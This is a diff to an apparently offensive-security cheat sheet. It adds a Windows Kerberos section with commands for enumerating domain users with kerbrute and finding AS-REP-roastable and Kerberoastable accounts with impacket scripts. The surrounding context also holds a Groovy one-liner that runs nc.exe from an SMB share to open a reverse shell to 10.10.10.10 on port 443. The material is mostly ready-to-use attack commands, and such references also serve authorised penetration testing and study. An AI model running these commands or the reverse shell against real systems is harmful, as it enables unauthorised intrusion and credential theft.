@@ -8,6 +8,36 @@
 # Shared resource
 println "\\\\10.10.10.10\\smbFolder\\nc.exe -e 10.10.10.10 443".execute().text
 ```
+------------------------------------------------------------------------------------------------------
+# Windows Section
+
+# Kerberos
+
+## Enumerating valid users
+
+[kerbrute](https://github.com/ropnop/kerbrute)
+
+Find **valid** domain controller users
+
+```powershell
+kerbrute userenum --dc 10.10.10.250 -d domain.local users.list
+```
+
+Combinating with [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
+
+Find **ASREPRoast** users
+
+```powershell
+GetNPUsers.py domain.local/ --no-pass -usersfile valid_users.list
+```
+
+Find **Kerberoasting** users
+
+Combinating with [GetUsersSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
+
+```powershell
+GetUsersSPNs.py 'domain.local/jan:password'
+```
 
 # Windows Privilege Escalation Techniques
 
